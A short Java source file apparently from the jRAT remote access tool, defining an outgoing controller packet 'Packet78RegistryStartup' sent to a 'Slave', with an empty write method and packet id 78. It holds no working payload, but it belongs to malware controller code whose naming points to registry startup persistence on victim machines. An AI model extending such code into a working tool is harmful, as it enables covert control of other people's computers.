package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet78RegistryStartup implements OutgoingPacket {

	@Override
	public void write(Slave slave) throws Exception {

	}

	@Override
	public short getPacketId() {
		return 78;
	}

}
